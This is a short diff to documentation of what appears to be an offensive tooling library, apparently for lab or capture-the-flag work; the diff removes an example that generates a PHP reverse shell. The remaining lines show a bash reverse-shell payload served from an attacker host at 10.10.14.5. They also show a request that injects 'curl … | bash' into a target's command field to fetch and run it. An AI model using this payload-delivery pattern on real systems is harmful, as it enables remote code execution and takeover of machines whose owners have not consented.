@@ -155,10 +155,6 @@ Utility modules automatically write payloads to ``payloads/`` for serving.
    # Returns: "shells/rev_bash.sh"
    # Served at: http://10.10.14.5:8000/shells/rev_bash.sh
 
-   # Generate PHP shell → payloads/shells/rev_php.php
-   php_path = php_shell("10.10.14.5", 4444)
-   # Served at: http://10.10.14.5:8000/shells/rev_php.php
-
    # Trigger download on target
    requests.post(target, data={
        "cmd": f"curl http://10.10.14.5:8000/{path} | bash"
